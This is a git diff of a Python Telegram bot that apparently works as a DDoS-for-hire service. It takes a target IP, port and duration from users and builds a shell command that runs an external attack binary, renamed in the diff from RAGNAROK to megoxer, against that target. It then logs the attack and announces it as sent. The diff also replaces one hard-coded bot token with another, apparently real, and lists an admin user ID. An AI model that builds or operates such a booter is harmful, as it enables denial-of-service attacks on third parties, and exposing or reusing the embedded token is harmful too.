@@ -7,7 +7,7 @@ import threading
 from telebot import types
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7404351144:AAHBMvt2Ak3CuqtNfNEKq2R2-6WMEDMLHng')
+bot = telebot.TeleBot('7719882963:AAHbnfLTMETNu3jsE421T8Jim_sSgX52QUE')
 
 # Admin user IDs
 admin_id = {"7469108296"}
@@ -154,7 +154,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
+                full_command = f"./megoxer {target} {port} {time}"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
